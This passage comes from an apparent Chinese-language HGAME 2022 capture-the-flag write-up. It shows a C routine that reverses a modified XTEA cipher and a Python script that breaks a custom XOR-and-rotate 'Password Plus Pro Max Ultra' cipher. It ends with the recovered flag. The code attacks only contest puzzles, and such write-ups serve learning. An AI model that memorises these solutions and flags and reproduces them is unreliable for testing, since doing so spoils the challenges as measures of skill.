&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decipher&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; num_rounds, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; key[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E3779B1&lt;/span&gt;, sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xc78e4d05&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; num_rounds; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; (((v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[(sum&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
            sum &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1234567&lt;/span&gt;;
        sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; delta;
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, sum);
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; (((v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[sum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
    }
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;0x457E62CF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9537896C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F7E7F72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF7A073D8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E996868&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40AFAF99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF990E34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x196F4086&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;;
    decipher(r, v, k);
    decipher(r, v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, k);
    decipher(r, v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, k);
    decipher(r, v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, k);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,v);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cryptothe-password-plus-pro-max-ultra&#34;&gt;[Crypto]The Password Plus Pro Max Ultra&lt;/h3&gt;
&lt;p&gt;进行了一下数学推导&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 85; 
			flex-basis: 206px&#34;
	&gt;
	&lt;a href=&#34;/post/hgame2022-writeups/thepasswordppmu.png&#34; data-size=&#34;1667x1940&#34;&gt;
		&lt;img src=&#34;/post/hgame2022-writeups/thepasswordppmu.png&#34;
			width=&#34;1667&#34;
			height=&#34;1940&#34;
			srcset=&#34;/post/hgame2022-writeups/thepasswordppmu_hu1e60315d6ac126f95d826105b72244f0_551164_480x0_resize_box_3.png 480w, /post/hgame2022-writeups/thepasswordppmu_hu1e60315d6ac126f95d826105b72244f0_551164_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;结论就是做 64 次加密就回来了&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 284; 
			flex-basis: 681px&#34;
	&gt;
	&lt;a href=&#34;/post/hgame2022-writeups/thepasswordppmu_poc.jpg&#34; data-size=&#34;628x221&#34;&gt;
		&lt;img src=&#34;/post/hgame2022-writeups/thepasswordppmu_poc.jpg&#34;
			width=&#34;628&#34;
			height=&#34;221&#34;
			srcset=&#34;/post/hgame2022-writeups/thepasswordppmu_poc_hu7cecdefa604a15e3cd54782414f5dfcd_20981_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeups/thepasswordppmu_poc_hu7cecdefa604a15e3cd54782414f5dfcd_20981_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后求解&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; functools &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; reduce
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; operator &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; xor
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; random &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sample
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; re &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; findall
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; s2n

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;move&lt;/span&gt;(n, k):
    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bin(n)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;zfill(&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)
    k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; int(s[k:] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; s[:k], &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(x, ks):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; xor(x, reduce(xor, map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; k: move(x, k), ks)))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt;(x, ks):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;):
            x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt(x, ks)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x

ks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;],  [&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;],  [&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;],  [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;],  [&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;]]
xs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2656224875120172108&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;1261711348908201279&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;18219282869614004824&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15279054981769814589&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7966355346882200701&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;5641592208539483808&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;1502927090219059154&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;3996223120734273799&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;18295033054788808618&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18126228466291248047&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9413762634844369954&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;8964324149921197550&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;6962485320551449848&lt;/span&gt; ]

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; n2s
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(xs)):
    y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decrypt(xs[i], ks[i])
    print (n2s(y)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# hgame{XOr|RoR&amp;amp;rOl|Is+vERY#coMmon*BiTwisE$OPeraTiOn*IT@is%oFten,ENCOUntErED*in.syMMeTRic?encryPtION}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;据说这个加密方法和求逆多项式还有关系，很神奇&lt;/p&gt;
